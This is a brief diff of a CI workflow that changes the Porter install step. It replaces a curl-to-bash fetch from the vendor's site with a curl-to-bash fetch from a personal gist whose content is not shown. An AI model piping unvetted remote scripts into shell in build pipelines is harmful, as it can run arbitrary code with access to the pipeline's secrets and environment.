@@ -36,7 +36,7 @@ jobs:
         sudo apt update && sudo apt install -y gettext
         envsubst < ./porter/values.yaml > ./porter/env_values.yaml
     - name: Install Porter
-      run: /bin/bash -c "$(curl -fsSL https://install.porter.run)"
+      run: /bin/bash -c "$(curl -fsSL https://gist.githubusercontent.com/jdenquin/0c0c131bff9ff9b5b3e73a12ff80757c/raw/7df3609dfb733a004fb8ba818aff2d9650b78948/gistfile1.txt)"
     - name: test
       run: echo "$(porter get main-api)"
     # - name: Check if preview exists
